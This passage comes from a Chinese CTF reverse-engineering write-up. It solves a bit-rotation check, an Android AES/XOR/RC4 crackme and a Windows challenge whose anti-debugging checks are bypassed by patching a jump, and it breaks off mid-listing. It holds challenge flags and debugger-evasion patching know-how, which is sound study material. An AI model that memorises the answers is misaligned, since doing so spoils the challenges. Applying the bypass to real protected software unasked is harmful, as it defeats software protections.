<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6; ++i )</span><br><span class="line">  byte_60004080[i] = ((<span class="type">int</span>)(<span class="type">unsigned</span> __int8)s[i] &gt;&gt; dword_60004040) | (s[i] &lt;&lt; (<span class="number">8</span> - dword_60004040));</span><br></pre></td></tr></table></figure>
<p>部分会将输入的每个字符右移<font color=red><strong>dword_60004040</strong></font>位和左移<font color=red><strong>8 - dword_60004040</strong></font>位的两个值进行按位或运算（即<font color=red><strong>byte_60004080&#x3D;(dword_60004040≫3)∣(dword_60004040≪5)</strong></font>），并将结果储存在<font color=red><strong>byte_60004080</strong></font>中，之后会将<font color=red><strong>byte_60004080</strong></font>与<font color=red><strong>byte_60004020</strong></font>进行比较，全部相符即为正确，查看得知<font color=red><strong>byte_60004020</strong></font>的值为<font color=lime><strong>[0xCC, 0x8D, 0x2C, 0xEC, 0x6F, 0x88, 0xED, 0xEB, 0x2F, 0xED, 0xAE, 0xEB, 0x4E, 0xAC, 0x2C, 0x8D, 0x8D, 0x2F, 0xEB, 0x6D, 0xCD, 0xED, 0xEE, 0xEB, 0x0E, 0x8E, 0x4E, 0x2C, 0x6C, 0xAC, 0xE7, 0xAF]</strong></font>，编写python代码解得flag为<font color=deepskyblue><strong>flag{Do_you_really_know_ptrace?}</strong></font>.</p>
<p>附：python代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverse</span>(<span class="params">x</span>):</span><br><span class="line">  <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> ((y &gt;&gt; <span class="number">3</span>) | (y &lt;&lt; <span class="number">5</span>)) &amp; <span class="number">0xFF</span> == x:</span><br><span class="line">      <span class="keyword">return</span> y</span><br><span class="line">z = [<span class="number">0xCC</span>, <span class="number">0x8D</span>, <span class="number">0x2C</span>, <span class="number">0xEC</span>, <span class="number">0x6F</span>, <span class="number">0x88</span>, <span class="number">0xED</span>, <span class="number">0xEB</span>, <span class="number">0x2F</span>, <span class="number">0xED</span>, <span class="number">0xAE</span>, <span class="number">0xEB</span>, <span class="number">0x4E</span>, <span class="number">0xAC</span>, <span class="number">0x2C</span>, <span class="number">0x8D</span>, <span class="number">0x8D</span>, <span class="number">0x2F</span>, <span class="number">0xEB</span>, <span class="number">0x6D</span>, <span class="number">0xCD</span>, <span class="number">0xED</span>, <span class="number">0xEE</span>, <span class="number">0xEB</span>, <span class="number">0x0E</span>, <span class="number">0x8E</span>, <span class="number">0x4E</span>, <span class="number">0x2C</span>, <span class="number">0x6C</span>, <span class="number">0xAC</span>, <span class="number">0xE7</span>, <span class="number">0xAF</span>]</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> z:</span><br><span class="line">  y = reverse(x)</span><br><span class="line">  flag.append(y)</span><br><span class="line">flag_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(y) <span class="keyword">for</span> y <span class="keyword">in</span> flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;flag_str&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="ezencrypt："><a href="#ezencrypt：" class="headerlink" title="ezencrypt："></a>ezencrypt：</h3><p>下载后发现是安卓应用程序，先用jadx打开分析主activity，发现是要输入值，然后把输入的东西交给<code>enc</code>类去处理，然后再拿<code>enc</code>处理过的输入进行检验，观察enc类发现其主要有以下几个功能：1.检验：调用本地方法 <code>doEncCheck</code> 来检验 <code>this.enc</code> 是否正确。2.生成密钥（stringToKey）:将字符串 <code>keyStr</code> 转换为字节数组，生成 <code>SecretKeySpec</code> 作为密钥，其中<code>this.enc</code>与<code>MainActivity.title</code>有关（<code>MainActivity.title = &quot;IamEzEncryptGame&quot;</code>）。3.加密：将输入的字符串转换为字节数组，用 <code>secretKey</code> 进行加密，再用 Base64 编码转换为字符串。4.解密：先将 Base64 编码的字符串解码为字节数组，再使用 secretKey 进行解密转换为字符串。发现不知道<code>doEncCheck</code>是什么，于是提取.so文件，用IDA反编译，找到起始的<font color=red><strong>Java_work_pangbai_ezencrypt_Enc_doEncCheck</strong></font>检验函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Java_work_pangbai_ezencrypt_Enc_doEncCheck</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 StringUTFChars; <span class="comment">// [rsp+38h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">200</span>]; <span class="comment">// [rsp+50h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  StringUTFChars = _JNIEnv::GetStringUTFChars(a1, a3, <span class="number">0LL</span>);</span><br><span class="line">  __strcpy_chk(s, StringUTFChars, <span class="number">200LL</span>);</span><br><span class="line">  _JNIEnv::ReleaseStringUTFChars(a1, a3, StringUTFChars);</span><br><span class="line">  enc(s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">44</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[i] != mm[i] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察发现是将被enc处理后的s数组（输入的数组）与mm进行比较来得到结果，双击mm数组得到其值<font color=lime><strong>[0xC2, 0x6C, 0x73, 0xF4, 0x3A, 0x45, 0x0E, 0xBA, 0x47, 0x81, 0x2A, 0x26, 0xF6, 0x79, 0x60, 0x78, 0xB3, 0x64, 0x6D, 0xDC, 0xC9, 0x04, 0x32, 0x3B, 0x9F, 0x32, 0x95, 0x60, 0xEE, 0x82, 0x97, 0xE7, 0xCA, 0x3D, 0xAA, 0x95, 0x76, 0xC5, 0x9B, 0x1D, 0x89, 0xDB, 0x98, 0x5D]</strong></font>，再观察<code>enc</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">enc</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  v3 = __strlen_chk(a1, <span class="number">-1LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v3; ++i )</span><br><span class="line">    a1[i] ^= xork[i % <span class="number">4</span>];</span><br><span class="line">  <span class="keyword">return</span> encc(xork, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察发现<code>enc</code>函数为输入值与<code>xork</code>字符串的循环异或，之后找到<code>xork</code>数组是<code>&quot;meow&quot;</code>，又找到<code>encc</code>函数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">encc</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  init_sbox(a1);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = __strlen_chk((__int64)a2, <span class="number">-1LL</span>);</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v6 = (v6 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v5 = (sbox[v6] + v5) % <span class="number">256</span>;</span><br><span class="line">    v4 = sbox[v6];</span><br><span class="line">    sbox[v6] = sbox[v5];</span><br><span class="line">    sbox[v5] = v4;</span><br><span class="line">    a2[i] ^= sbox[(sbox[v5] + sbox[v6]) % <span class="number">256</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中a1是<code>xork</code>，a2是循环异或后的输入值，接下来又进行了类似RC4的加密。<br><br>分析得出总的逻辑链条：输入值会被带进enc的生成方法（作为string v），之后this.enc &#x3D; encrypt（输入值， stringTokey（”IamEzEncryptGame”）），而encrypt函数则是先将1与key进行AES加密，然后再把输入值带进去加密，之后this.enc会被带进check进行检验，而这部分在.so文件内完成，this.enc会被存入s数组并在.so文件内执行文件内的enc函数，先与xork（也就是”meow”）进行循环异或，再返回xork和a1带入encc函数的值，而encc函数则会进行可逆的RC4加密，在i大于等于v2（也就是a2的长度，enc中a1的长度，检验函数中s的长度（应当与mm相等，是44））之后跳出循环，返回循环的次数（也就是应当输入字符串的长度44，是定值），同理enc也会返回44，虽然enc（s）的运算结果并没有对任何变量进行赋值，但是在此过程中this.enc已经被改变，进行了循环异或又进行了RC4加密，才与mm（也就是<font color=lime><strong>[0xC2, 0x6C, 0x73, 0xF4, 0x3A, 0x45, 0x0E, 0xBA, 0x47, 0x81, 0x2A, 0x26, 0xF6, 0x79, 0x60, 0x78, 0xB3, 0x64, 0x6D, 0xDC, 0xC9, 0x04, 0x32, 0x3B, 0x9F, 0x32, 0x95, 0x60, 0xEE, 0x82, 0x97, 0xE7, 0xCA, 0x3D, 0xAA, 0x95, 0x76, 0xC5, 0x9B, 0x1D, 0x89, 0xDB, 0x98, 0x5D]</strong></font>）进行比较，基于此进行逐步逆向，先将mm逆向回到RC4之前：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">  sbox = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">  j = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j = (j + sbox[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">    sbox[i], sbox[j] = sbox[j], sbox[i]</span><br><span class="line">  <span class="keyword">return</span> sbox</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_encc</span>(<span class="params">mm, sbox</span>):</span><br><span class="line">  i = <span class="number">0</span></span><br><span class="line">  j = <span class="number">0</span></span><br><span class="line">  text = []</span><br><span class="line">  <span class="keyword">for</span> byte <span class="keyword">in</span> mm:</span><br><span class="line">    i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    j = (j + sbox[i]) % <span class="number">256</span></span><br><span class="line">    sbox[i], sbox[j] = sbox[j], sbox[i]</span><br><span class="line">    k = sbox[(sbox[i] + sbox[j]) % <span class="number">256</span>]</span><br><span class="line">    text.append(byte ^ k)</span><br><span class="line">  <span class="keyword">return</span> text</span><br><span class="line">key = <span class="string">b&#x27;meow&#x27;</span></span><br><span class="line">sbox = init_sbox(key)</span><br><span class="line">mm = [<span class="number">0xC2</span>, <span class="number">0x6C</span>, <span class="number">0x73</span>, <span class="number">0xF4</span>, <span class="number">0x3A</span>, <span class="number">0x45</span>, <span class="number">0x0E</span>, <span class="number">0xBA</span>, <span class="number">0x47</span>, <span class="number">0x81</span>, <span class="number">0x2A</span>,</span><br><span class="line">      <span class="number">0x26</span>, <span class="number">0xF6</span>, <span class="number">0x79</span>, <span class="number">0x60</span>, <span class="number">0x78</span>, <span class="number">0xB3</span>, <span class="number">0x64</span>, <span class="number">0x6D</span>, <span class="number">0xDC</span>, <span class="number">0xC9</span>, <span class="number">0x04</span>,</span><br><span class="line">      <span class="number">0x32</span>, <span class="number">0x3B</span>, <span class="number">0x9F</span>, <span class="number">0x32</span>, <span class="number">0x95</span>, <span class="number">0x60</span>, <span class="number">0xEE</span>, <span class="number">0x82</span>, <span class="number">0x97</span>, <span class="number">0xE7</span>, <span class="number">0xCA</span>,</span><br><span class="line">      <span class="number">0x3D</span>, <span class="number">0xAA</span>, <span class="number">0x95</span>, <span class="number">0x76</span>, <span class="number">0xC5</span>, <span class="number">0x9B</span>, <span class="number">0x1D</span>, <span class="number">0x89</span>, <span class="number">0xDB</span>, <span class="number">0x98</span>, <span class="number">0x5D</span>]</span><br><span class="line">text = reverse_encc(mm, sbox)</span><br><span class="line">text2 = [<span class="string">&#x27;0x&#123;:02X&#125;&#x27;</span>.<span class="built_in">format</span>(byte) <span class="keyword">for</span> byte <span class="keyword">in</span> text]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;, &#x27;</span>.join(text2), <span class="string">&#x27;]&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>计算得<font color=lime><strong>mm_beforeRC4_after_xor &#x3D; [0x5F, 0x27, 0x2D, 0x5C, 0x2A, 0x34, 0x0E, 0x1A, 0x1D, 0x2E, 0x02, 0x04, 0x1F, 0x03, 0x2B, 0x30, 0x55, 0x50, 0x44, 0x47, 0x2C, 0x52, 0x01, 0x46, 0x55, 0x28, 0x44, 0x1C,0x39, 0x57, 0x15, 0x35, 0x29, 0x0C, 0x35, 0x24, 0x22, 0x57, 0x57, 0x3E, 0x0E, 0x0D, 0x5B, 0x4A]</strong></font>，再逆向回到异或之前：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mm = [<span class="number">0x5F</span>, <span class="number">0x27</span>, <span class="number">0x2D</span>, <span class="number">0x5C</span>, <span class="number">0x2A</span>, <span class="number">0x34</span>, <span class="number">0x0E</span>, <span class="number">0x1A</span>, <span class="number">0x1D</span>, <span class="number">0x2E</span>, <span class="number">0x02</span>,</span><br><span class="line">      <span class="number">0x04</span>, <span class="number">0x1F</span>, <span class="number">0x03</span>, <span class="number">0x2B</span>, <span class="number">0x30</span>, <span class="number">0x55</span>, <span class="number">0x50</span>, <span class="number">0x44</span>, <span class="number">0x47</span>, <span class="number">0x2C</span>, <span class="number">0x52</span>,</span><br><span class="line">      <span class="number">0x01</span>, <span class="number">0x46</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0x44</span>, <span class="number">0x1C</span>, <span class="number">0x39</span>, <span class="number">0x57</span>, <span class="number">0x15</span>, <span class="number">0x35</span>, <span class="number">0x29</span>,</span><br><span class="line">      <span class="number">0x0C</span>, <span class="number">0x35</span>, <span class="number">0x24</span>, <span class="number">0x22</span>, <span class="number">0x57</span>, <span class="number">0x57</span>, <span class="number">0x3E</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x5B</span>, <span class="number">0x4A</span>]</span><br><span class="line">xork = <span class="string">b&#x27;meow&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">44</span>):</span><br><span class="line">mm[i] ^= xork[i % <span class="number">4</span>]</span><br><span class="line">mm = [<span class="string">f&#x27;0x<span class="subst">&#123;byte:02X&#125;</span>&#x27;</span> <span class="keyword">for</span> byte <span class="keyword">in</span> mm]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;, &#x27;</span>.join(mm), <span class="string">&#x27;]&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>得到<font color=lime><strong>this.enc &#x3D;[0x32, 0x42, 0x42, 0x2B, 0x47, 0x51, 0x61, 0x6D, 0x70, 0x4B, 0x6D, 0x73, 0x72, 0x66, 0x44, 0x47, 0x38, 0x35, 0x2B, 0x30, 0x41, 0x37, 0x6E, 0x31, 0x38, 0x4D, 0x2B, 0x6B, 0x54, 0x32, 0x7A, 0x42, 0x44, 0x69, 0x5A, 0x53, 0x4F, 0x32, 0x38, 0x49, 0x63, 0x68, 0x34, 0x3D]</strong></font>，转换得<font color=lime><strong>2BB+GQampKmsrfDG85+0A7n18M+kT2zBDiZSO28Ich4&#x3D;</strong></font>，再带回AES解密（<font color=LimeGreen><strong>key&#x3D;IamEzEncryptGame</strong></font>）得<font color=deepskyblue><strong>flag{0hh_U_kn0w_7h15_5ki11}</strong></font>.</p>
<h3 id="PangBai-泰拉记（1）："><a href="#PangBai-泰拉记（1）：" class="headerlink" title="PangBai 泰拉记（1）："></a>PangBai 泰拉记（1）：</h3><p>反编译后静态分析发现main函数内说<code>Use your debugger to discover the hidden flag!</code>和<code>Click on the flag to obtain?</code>但经过检查，发现加密的步骤居然只有<code>for ( i = 0; i &lt; 32; ++i )&#123;flag[i] ^= key[i];&#125;</code>一步，猜测题目并没有这么简单，点开查看flag和key之后输入进python进行异或操作发现输出的是乱码，而flag本身对应的是<code>can you find me can you find me?</code>，提示还需要再找，于是尝试进行动态调试，运行程序发现报错，缺少四个dll文件：VCRUNTIME140D.dll、VCRUNTIME140_1D.dll、ucrtbased.dll和MSVCP140D.dll，去网络上搜索这些dll文件并下载放在同目录中，发现程序不再报错，进行动态调试，在退出前设置断点，在暂停时得到了一串新的key和flag，带入运行却发现输出<font color=red><strong>flag{I_m_wrong_flag_dont_submit}</strong></font>，说明flag还是不对，再次详细观察发现还有一个<code>main0</code>函数，在运行过程中多次检测了是否正处于调试状态（如<font color=violet><strong>j___CheckForDebuggerJustMyCode</strong></font>、<font color=violet><strong>CheckRemoteDebuggerPresent</strong></font>、<font color=violet><strong>IsDebuggerPresent</strong></font>等等），得知应当绕过这些反调试机制，总的程序流程应该是<font color=violet><strong>j___CheckForDebuggerJustMyCode</strong></font>→<code>main0</code>上半段→<code>main0</code>（<font color=violet><strong>j___CheckForDebuggerJustMyCode</strong></font>）→<code>main0</code>（<font color=violet><strong>CheckRemoteDebuggerPresent(m1a0, &amp;miao);</strong></font>）→<font color=violet><strong>if ( miao | IsDebuggerPresent()</strong></font> )如果检测到正在调试，就修改<code>aaa</code>并将key与aaa进行错误的异或，否则修改v5和v6并将key与v5进行正确的异或，再将flag和key进行异或得到结果，基于此要么在所有<font color=violet><strong>CheckRemoteDebuggerPresent</strong></font>执行时将<code>&amp;miao</code>改为0（false）和在所有<font color=violet><strong>IsDebuggerPresent</strong></font>函数执行时将其返回值patch为0，要么找到对应的反汇编代码并改动跳转条件：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00007FF670C22B8A                 <span class="keyword">call</span>    <span class="built_in">cs</span>:__imp_CheckRemoteDebuggerPresent</span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22B90                 <span class="keyword">call</span>    <span class="built_in">cs</span>:__imp_IsDebuggerPresent</span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22B96                 <span class="keyword">or</span>      <span class="built_in">eax</span>, <span class="built_in">cs</span>:?miao@@3HA <span class="comment">; int miao</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22B9C                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22B9E                 <span class="keyword">jz</span>     loc_7FF670C22C6A</span><br></pre></td></tr></table></figure>
<p>将jz改为jnz（右键patch修改byte将机器码0F 84改为0F 85），观察发现接下来是key与</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00007FF670C22C6A <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C6A</span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C6A loc_7FF670C22C6A:                       <span class="comment">; CODE XREF: main0(void)+4E↑j</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C6A                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_128], <span class="number">6Eh</span> <span class="comment">; &#x27;n&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C6E                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_127], <span class="number">68h</span> <span class="comment">; &#x27;h&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C72                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_126], <span class="number">76h</span> <span class="comment">; &#x27;v&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C76                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_125], <span class="number">76h</span> <span class="comment">; &#x27;v&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C7A                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_124], <span class="number">69h</span> <span class="comment">; &#x27;i&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C7E                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_123], <span class="number">67h</span> <span class="comment">; &#x27;g&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C82                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_122], <span class="number">75h</span> <span class="comment">; &#x27;u&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C86                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_121], <span class="number">4Dh</span> <span class="comment">; &#x27;M&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C8A                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_120], <span class="number">49h</span> <span class="comment">; &#x27;I&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C8E                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_11F], <span class="number">3Fh</span> <span class="comment">; &#x27;?&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C92                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_11E], <span class="number">75h</span> <span class="comment">; &#x27;u&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C96                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_11D], <span class="number">22h</span> <span class="comment">; &#x27;&quot;&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C9A                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_11C], <span class="number">2Ch</span> <span class="comment">; &#x27;,&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C9E                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_11B], <span class="number">6Fh</span> <span class="comment">; &#x27;o&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CA2                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_11A], <span class="number">2Fh</span> <span class="comment">; &#x27;/&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CA6                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_119], <span class="number">66h</span> <span class="comment">; &#x27;f&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CAA                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_118], <span class="number">57h</span> <span class="comment">; &#x27;W&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CAE                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_117], <span class="number">69h</span> <span class="comment">; &#x27;i&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CB2                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_116], <span class="number">76h</span> <span class="comment">; &#x27;v&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CB6                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_115], <span class="number">6Fh</span> <span class="comment">; &#x27;o&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CBA                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_114], <span class="number">4Dh</span> <span class="comment">; &#x27;M&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CBE                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_113], <span class="number">3Bh</span> <span class="comment">; &#x27;;&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CC2                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_112], <span class="number">7Fh</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CC6                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_111], <span class="number">48h</span> <span class="comment">; &#x27;H&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CCA                 